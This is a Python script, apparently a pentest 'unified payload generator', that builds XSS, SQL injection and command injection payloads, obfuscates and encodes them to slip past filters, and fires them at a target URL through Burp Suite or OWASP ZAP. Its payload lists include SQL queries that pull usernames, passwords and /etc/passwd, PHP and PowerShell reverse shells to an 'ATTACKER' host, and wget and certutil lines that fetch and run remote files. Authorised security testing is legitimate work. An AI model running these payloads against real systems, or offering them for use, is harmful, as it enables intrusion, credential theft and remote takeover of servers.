import os
import sys
import time
import argparse
import urllib.parse
import base64
import json
import pyperclip
import requests
from datetime import datetime
from zapv2 import ZAPv2  # pip install python-owasp-zap-v2.4


# ------------------ Payload Definitions ------------------

xss_payloads = [
    {"type": "reflected", "payload": "<script>alert(1)</script>", "bypass": "basic"},
    {"type": "reflected", "payload": "<svg/onload=alert(1)>", "bypass": "svg"},
    {"type": "reflected", "payload": "<img src=x onerror=alert('XSS')>", "bypass": "onerror"},
    {"type": "stored", "payload": "<div onmouseover=alert('XSS')>Hover me</div>", "bypass": "event"},
    {"type": "dom", "payload": "javascript:alert(1)", "bypass": "href"},
    {"type": "reflected", "payload": "<iframe srcdoc='<script>alert(1)</script>'></iframe>", "bypass": "srcdoc"}
]

sqli_payloads = [
    # --- Error Based ---
    {"type": "error", "payload": "'", "bypass": "error"},
    {"type": "error", "payload": "\"", "bypass": "error"},
    {"type": "error", "payload": "';", "bypass": "error"},
    {"type": "error", "payload": "'--", "bypass": "error"},
    {"type": "error", "payload": "'#", "bypass": "error"},
    {"type": "error", "payload": "'/*", "bypass": "error"},
    {"type": "error", "payload": "' or ''='", "bypass": "error"},
    {"type": "error", "payload": "' OR 1=1--", "bypass": "error"},
    {"type": "error", "payload": "' OR 1=1#", "bypass": "error"},
    {"type": "error", "payload": "' OR 1=1/*", "bypass": "error"},
    {"type": "error", "payload": "' AND 1=1--", "bypass": "error"},
    {"type": "error", "payload": "' AND 1=2--", "bypass": "error"},
    {"type": "error", "payload": "' AND 1=CONVERT(int, (SELECT @@version))--", "bypass": "error"},
    {"type": "error", "payload": "' AND updatexml(null, concat(0x3a, version()), null)--", "bypass": "error"},
    {"type": "error", "payload": "' AND extractvalue(1, concat(0x3a, (SELECT version())))--", "bypass": "error"},
    {"type": "error", "payload": "' AND 1=CAST((SELECT @@version) AS INT)--", "bypass": "error"},
    {"type": "error", "payload": "' AND 1=CAST((SELECT user()) AS INT)--", "bypass": "error"},
    {"type": "error", "payload": "' AND 1=CAST((SELECT database()) AS INT)--", "bypass": "error"},
    {"type": "error", "payload": "' AND 1=(SELECT COUNT(*) FROM users)--", "bypass": "error"},
    {"type": "error", "payload": "' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--", "bypass": "error"},
    {"type": "error", "payload": "' AND (SELECT 1 FROM users LIMIT 1)=1--", "bypass": "error"},
    {"type": "error", "payload": "' AND ASCII(SUBSTRING(@@version,1,1))=77--", "bypass": "error"},
    {"type": "error", "payload": "' AND 1=1; --", "bypass": "error"},
    {"type": "error", "payload": "'||(SELECT NULL)||'", "bypass": "error"},
    {"type": "error", "payload": "'||version()||'", "bypass": "error"},
    {"type": "error", "payload": "\"||(SELECT NULL)||\"", "bypass": "error"},
    {"type": "error", "payload": "1' AND 1=1--", "bypass": "error"},
    {"type": "error", "payload": "1' AND 1=2--", "bypass": "error"},
    {"type": "error", "payload": "1' AND '1'='1'--", "bypass": "error"},
    {"type": "error", "payload": "1' AND '1'='2'--", "bypass": "error"},
    {"type": "error", "payload": "' AND EXISTS(SELECT * FROM users)--", "bypass": "error"},
    {"type": "error", "payload": "' AND NOT EXISTS(SELECT * FROM users)--", "bypass": "error"},
    {"type": "error", "payload": "' AND 1 IN (SELECT COUNT(*) FROM information_schema.tables)--", "bypass": "error"},
    {"type": "error", "payload": "' AND 1=(SELECT 1 FROM dual WHERE database() LIKE '%')--", "bypass": "error"},
    {"type": "error", "payload": "' AND (SELECT COUNT(*) FROM users) > 0--", "bypass": "error"},
    {"type": "error", "payload": "' AND (SELECT name FROM master..sysdatabases) IS NOT NULL--", "bypass": "error"},
    {"type": "error", "payload": "' AND (SELECT table_name FROM information_schema.tables LIMIT 1)=table_name--", "bypass": "error"},
    {"type": "error", "payload": "' AND 1=CAST(SERVERPROPERTY('ProductVersion') AS INT)--", "bypass": "error"},
    {"type": "error", "payload": "' AND sys.fn_sqlvarbasetostr(HASHBYTES('MD5','1')) IS NOT NULL--", "bypass": "error"},
    {"type": "error", "payload": "' AND 1=1 WAITFOR DELAY '00:00:05'--", "bypass": "error"},
    {"type": "error", "payload": "' AND benchmark(1000000,MD5('test'))--", "bypass": "error"},
    {"type": "error", "payload": "' AND LENGTH(@@version)>1--", "bypass": "error"},
    {"type": "error", "payload": "' AND POSITION('Microsoft' IN @@version)>0--", "bypass": "error"},
    {"type": "error", "payload": "' AND @@version LIKE '%SQL%'--", "bypass": "error"},

    # --- Union Based ---
    {"type": "union", "payload": "' UNION SELECT NULL--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT NULL,NULL--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT NULL,NULL,NULL--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT 1,2--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT 1,2,3--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT username,password FROM users--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT table_name,column_name FROM information_schema.columns--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT 1, version()--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT 1, database()--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT 1, user()--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT name FROM sysobjects--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT name FROM sqlite_master--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT schema_name FROM information_schema.schemata--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT table_name FROM information_schema.tables--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT column_name FROM information_schema.columns--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT NULL,@@version--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT NULL,@@hostname--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT NULL,@@datadir--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT NULL,USER()--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT NULL,DATABASE()--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT NULL,VERSION()--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT LOAD_FILE('/etc/passwd')--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT 1,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT 1,@@global.sql_mode--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT 1,@@version_compile_os--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT 1,@@innodb_version--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT 1,@@plugin_dir--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT 1,@@secure_file_priv--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT 1,SESSION_USER()--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT 1,CONNECTION_ID()--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT 1,BENCHMARK(1000000,MD5('A'))--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT 1,SLEEP(5)--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT 1,IF(1=1,SLEEP(5),0)--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT 1,CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT 1,CONCAT_WS(':',USER(),DATABASE())--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT 1,CONCAT_WS(':',VERSION(),DATABASE())--", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT 1,NULL#", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT 1,NULL/*", "bypass": "union"},
    {"type": "union", "payload": "' UNION SELECT 1,NULL-- -", "bypass": "union"},

    # --- Blind Based ---
    {"type": "blind", "payload": "' AND 1=1--", "bypass": "blind"},
    {"type": "blind", "payload": "' AND 1=2--", "bypass": "blind"},
    {"type": "blind", "payload": "' AND 'a'='a'--", "bypass": "blind"},
    {"type": "blind", "payload": "' AND 'a'='b'--", "bypass": "blind"},
    {"type": "blind", "payload": "' AND EXISTS(SELECT * FROM users)--", "bypass": "blind"},
    {"type": "blind", "payload": "' AND NOT EXISTS(SELECT * FROM users)--", "bypass": "blind"},
    {"type": "blind", "payload": "' AND (SELECT COUNT(*) FROM users)>0--", "bypass": "blind"},
    {"type": "blind", "payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", "bypass": "blind"},
    {"type": "blind", "payload": "' AND (SELECT LENGTH(user())) > 0--", "bypass": "blind"},
    {"type": "blind", "payload": "' AND ASCII(SUBSTRING((SELECT user()),1,1))=114--", "bypass": "blind"},
    {"type": "blind", "payload": "' AND SLEEP(5)--", "bypass": "time"},
    {"type": "blind", "payload": "' OR IF(1=1, SLEEP(5), 0)--", "bypass": "time"},
    {"type": "blind", "payload": "' AND IF(1=1,SLEEP(5),0)--", "bypass": "time"},
    {"type": "blind", "payload": "' AND BENCHMARK(1000000, MD5('a'))--", "bypass": "blind"},
    {"type": "blind", "payload": "' AND IF(ASCII(SUBSTRING((SELECT user()),1,1))>80, SLEEP(5), 0)--", "bypass": "time"},
    {"type": "blind", "payload": "'; WAITFOR DELAY '00:00:05'--", "bypass": "blind"},
    {"type": "blind", "payload": "'; IF (1=1) WAITFOR DELAY '00:00:05'--", "bypass": "blind"},
    {"type": "blind", "payload": "'; IF EXISTS(SELECT * FROM users) WAITFOR DELAY '00:00:05'--", "bypass": "blind"},
    {"type": "blind", "payload": "'; IF LEN(user) > 1 WAITFOR DELAY '00:00:05'--", "bypass": "blind"},
    {"type": "blind", "payload": "'/**/AND/**/1=1--", "bypass": "blind"},
    {"type": "blind", "payload": "'/**/AND/**/'a'='a'--", "bypass": "blind"},
    {"type": "blind", "payload": "'/**/AND/**/EXISTS(SELECT/**/1)--", "bypass": "blind"},
    {"type": "blind", "payload": "'/**/OR/**/1=1--", "bypass": "blind"},
    {"type": "blind", "payload": "'/**/OR/**/'a'='a'--", "bypass": "blind"},
    {"type": "blind", "payload": "' AND ASCII(SUBSTRING((SELECT version()),1,1))=52--", "bypass": "blind"},
    {"type": "blind", "payload": "' AND ASCII(SUBSTRING((SELECT database()),1,1))=109--", "bypass": "blind"},
    {"type": "blind", "payload": "' AND ORD(MID((SELECT version()),1,1))=52--", "bypass": "blind"},
    {"type": "blind", "payload": "' AND (SELECT ASCII(SUBSTRING(@@version,1,1)))=77--", "bypass": "blind"},
    {"type": "blind", "payload": "' AND (SELECT 1 & 1)--", "bypass": "blind"},
    {"type": "blind", "payload": "' AND 1 ^ 0--", "bypass": "blind"},
]



linux_payloads = [
    {"payload": "; ls", "bypass": "chaining"},
    {"payload": "&& whoami", "bypass": "chaining"},
    {"payload": "| id", "bypass": "pipe"},
    {"payload": "`uname -a`", "bypass": "subshell"},
    {"payload": "$(id)", "bypass": "subshell"},
    {"payload": "; cat /etc/passwd", "bypass": "chaining"},
    {"payload": "; uname -a", "bypass": "chaining"},
    {"payload": "`cat /etc/passwd`", "bypass": "subshell"},
    {"payload": "$(cat /etc/passwd)", "bypass": "subshell"},
    {"payload": "; ls -lah", "bypass": "chaining"},
    {"payload": "; which bash", "bypass": "chaining"},
    {"payload": "; which python", "bypass": "chaining"},
    {"payload": "; which php", "bypass": "chaining"},
    {"payload": "; php -r 'fsockopen(\"ATTACKER:4444\",...,exec(\"/bin/sh -i\"));'", "bypass": "reverse_shell"},
    {"payload": "; wget http://ATTACKER/rev.php", "bypass": "file_download"},
    {"payload": "%0A wget http://ATTACKER/rev.php", "bypass": "newline"},
    {"payload": "; echo 1;sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}", "bypass": "polyglot_sleep"}
]

windows_payloads = [
    {"payload": "& dir", "bypass": "chaining"},
    {"payload": "| whoami", "bypass": "pipe"},
    {"payload": "& net user", "bypass": "chaining"},
    {"payload": "&& ver", "bypass": "chaining"},
    {"payload": "`systeminfo`", "bypass": "subshell"},
    {"payload": "%PROGRAMFILES:~10,-5%127.0.0.1", "bypass": "env_substr_trick"},
    {"payload": "%CommonProgramFiles:~10,-18%127.0.0.1", "bypass": "env_substr_trick"},
    {"payload": "powershell C:\\**2\\n??e*d.*? ", "bypass": "obf_powershell"},
    {"payload": "@^p^o^w^e^r^shell c:\\**32\\c*?c.e?e", "bypass": "obf_powershell"},
    {"payload": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);...\"", "bypass": "reverse_shell"},
    {"payload": "certutil -urlcache -f http://ATTACKER/payload.exe payload.exe && payload.exe", "bypass": "file_download"}
]

# ------------------ Encoding Functions ------------------

def encode_payload(payload, method):
    if method == "base64":
        return base64.b64encode(payload.encode()).decode()
    elif method == "url":
        return urllib.parse.quote(payload)
    elif method == "hex":
        return ''.join(f'\\x{ord(c):02x}' for c in payload)
    elif method == "unicode":
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    return payload

# ------------------ Obfuscation Functions ------------------

def obfuscate_comments(payload):
    return payload.replace(" ", "/**/")

def obfuscate_spacing(payload):
    return payload.replace(" ", "   ")

def obfuscate_encoding(payload):
    return encode_payload(payload, "hex")

def apply_obfuscation(payload, methods):
    if "comments" in methods:
        payload = obfuscate_comments(payload)
    if "spacing" in methods:
        payload = obfuscate_spacing(payload)
    if "encoding" in methods:
        payload = obfuscate_encoding(payload)
    return payload

# ------------------ Helper Function for Request Building ------------------
def build_http_request(target_url, param, payload):
    """Build HTTP request with proper query parameter handling"""
    parsed = urllib.parse.urlparse(target_url)
    q = urllib.parse.parse_qs(parsed.query)
    q[param] = [payload]  # Set as list for urlencode
    new_query = urllib.parse.urlencode(q, doseq=True)
    new_parsed = parsed._replace(query=new_query)
    path = new_parsed.path
    if not path:
        path = '/'
    if new_parsed.query:
        path += '?' + new_parsed.query
    request = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {parsed.netloc}\r\n"
        "User-Agent: PayloadGenerator/1.0\r\n"
        "Accept: */*\r\n\r\n"
    )
    return request

# ------------------ Updated Burp Suite Integration ------------------
def save_burp_request(payload, target_url, param, output_dir="burp_requests"):
    os.makedirs(output_dir, exist_ok=True)
    filename = f"payload_{int(time.time())}.txt"
    filepath = os.path.join(output_dir, filename)
    
    request = build_http_request(target_url, param, payload)
    
    with open(filepath, 'w') as f:
        f.write(request)
    print(f"[+] Burp request saved: {filepath}")
    print(" 1. Open Burp Suite > Repeater")
    print(" 2. Paste from file")
    return filepath

def send_to_burp_pro(payload, target_url, param, api_url):
    try:
        request = build_http_request(target_url, param, payload)
        resp = requests.post(
            f"{api_url}/burp/repeater/requests",
            json={"request": request},
            headers={"Content-Type": "application/json"}
        )
        if resp.status_code == 201:
            print("[+] Sent to Burp Pro via REST API")
            return True
        print(f"[!] Burp API error {resp.status_code}: {resp.text}")
    except Exception as e:
        print(f"[!] Burp API connection failed: {e}")
    return False

def copy_to_burp(payload, target_url, param):
    request = build_http_request(target_url, param, payload)
    pyperclip.copy(request)
    print("[+] Request copied to clipboard. Paste into Repeater with Ctrl+V")
    return request

# ------------------ Updated OWASP ZAP Integration ------------------
def send_to_zap(payload, target_url, param, api_key, proxy):
    try:
        parsed = urllib.parse.urlparse(target_url)
        q = urllib.parse.parse_qs(parsed.query)
        q[param] = [payload]  # Fixed: Set as list
        new_q = urllib.parse.urlencode(q, doseq=True)
        target = urllib.parse.urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_q, parsed.fragment
        ))
        zap = ZAPv2(apikey=api_key, proxies={'http': proxy, 'https': proxy})
        zap.urlopen(target)
        print(f"[+] Sent to ZAP: {payload}")
        return True
    except Exception as e:
        print(f"[!] ZAP error: {e}")
        return False

# ------------------ Generator Functions ------------------
def generate_xss_payloads(xss_type, bypass_filter, encode=None, obfuscate=False):
    results = []
    for p in xss_payloads:
        if p["type"] == xss_type and (bypass_filter == "all" or p["bypass"] == bypass_filter):
            mod = p["payload"]
            if obfuscate:
                mod = mod.replace("javascript", "java<!-- -->script").replace("<script>", "<scr<script>ipt>")
            if encode:
                mod = encode_payload(mod, encode)
            results.append({"type": "xss", "original": p["payload"], "payload": mod, "bypass": p["bypass"]})
    return results

def generate_sqli_payloads(sqli_type, bypass_filter, encode=None, obfuscate=False):
    results = []
    for p in sqli_payloads:
        if p["type"] == sqli_type and (bypass_filter == "all" or p["bypass"] == bypass_filter):
            mod = p["payload"]
            if obfuscate:
                mod = mod.replace(" ", "/**/").replace("--", "--+")
            if encode:
                mod = encode_payload(mod, encode)
            results.append({"type": "sqli", "original": p["payload"], "payload": mod, "bypass": p["bypass"]})
    return results

def generate_cmd_payloads(platform, bypass_filter, encode=None, obfuscate=None):
    if platform == "linux":
        payload_source = linux_payloads
    elif platform == "windows":
        payload_source = windows_payloads
    else:
        print("[!] Invalid platform. Choose 'linux' or 'windows'.")
        return []

    results = []
    for p in payload_source:
        if bypass_filter == "all" or p["bypass"] == bypass_filter:
            mod = p["payload"]
            # Handle both boolean and list obfuscate parameters
            if obfuscate:
                if isinstance(obfuscate, list):
                    mod = apply_obfuscation(mod, obfuscate)
                else:  # Boolean case from XSS/SQLi
                    mod = apply_obfuscation(mod, ["comments", "spacing", "encoding"])
            if encode:
                mod = encode_payload(mod, encode)
            results.append({"type": "cmd", "original": p["payload"], "payload": mod, "bypass": p["bypass"]})
    return results

# ------------------ Output Function ------------------

def output_payloads(payloads, output_format):
    if output_format == 'json':
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        fname = f"payloads_{ts}.json"
        with open(fname, 'w') as f:
            json.dump(payloads, f, indent=2)
        print(f"[+] Saved payloads to {fname}")
    elif output_format == 'clipboard':
        pyperclip.copy("\n".join(p['payload'] for p in payloads))
        print("[+] All payloads copied to clipboard.")
    else:
        for p in payloads:
            print(p['payload'])

def main():
    parser = argparse.ArgumentParser(description="Unified Payload Generator: XSS | SQLi | CMD")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--xss", action="store_true", help="Generate XSS payloads")
    group.add_argument("--sqli", action="store_true", help="Generate SQLi payloads")
    group.add_argument("--cmd", action="store_true", help="Generate Command Injection payloads")

    parser.add_argument("--type", default=None, help="Type: reflected/stored/dom | error/union/blind")
    parser.add_argument("--bypass", default="all", help="Bypass technique filter")
    parser.add_argument("--encode", choices=["base64", "url", "hex", "unicode"], help="Encoding method")
    parser.add_argument("--obfuscate", nargs='+', choices=["comments", "spacing", "encoding", "all"], help="Obfuscation techniques")
    parser.add_argument("--output", choices=["cli", "json", "clipboard"], default="cli", help="Output format")
    parser.add_argument("--platform", choices=["linux", "windows"], help="Platform for command injection (required with --cmd)")

    parser.add_argument('--burp', choices=['file','api','clipboard'])
    parser.add_argument('--burp-api', default='http://localhost:8090')
    parser.add_argument('--zap', action='store_true')
    parser.add_argument('--zap-api-key', default='')
    parser.add_argument('--zap-proxy', default='http://localhost:8080')
    parser.add_argument('--target', required=False)
    parser.add_argument('--param', default='input')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit()

    args = parser.parse_args()

    if args.sqli and args.type is None:
        args.type = "error"
    elif args.xss and args.type is None:
        args.type = "reflected"

    obf_methods = []
    if args.obfuscate:
        obf_methods = ["comments", "spacing", "encoding"] if "all" in args.obfuscate else args.obfuscate

    # Generate payloads first
    payloads = []
    if args.xss:
        payloads = generate_xss_payloads(args.type, args.bypass, args.encode, bool(args.obfuscate))
    elif args.sqli:
        payloads = generate_sqli_payloads(args.type, args.bypass, args.encode, bool(args.obfuscate))
    elif args.cmd:
        if not args.platform:
            print("[!] --platform is required with --cmd")
            sys.exit()
        payloads = generate_cmd_payloads(args.platform, args.bypass, args.encode, obf_methods)

    # Handle output formats
    if args.output != 'cli' and payloads:
        output_payloads(payloads, args.output)

    # Handle integrations
    if args.burp or args.zap:
        if not args.target:
            print('[!] --target is required for integration')
            sys.exit(1)
            
        for p in payloads:
            pay = p['payload']
            if args.burp:
                if args.burp == 'file':
                    save_burp_request(pay, args.target, args.param)
                elif args.burp == 'api':
                    send_to_burp_pro(pay, args.target, args.param, args.burp_api)
                elif args.burp == 'clipboard':
                    copy_to_burp(pay, args.target, args.param)
            if args.zap:
                send_to_zap(pay, args.target, args.param, args.zap_api_key, args.zap_proxy)
        return

    # Default output if not using integrations
    if payloads:
        output_payloads(payloads, args.output)

if __name__ == "__main__":
    main()
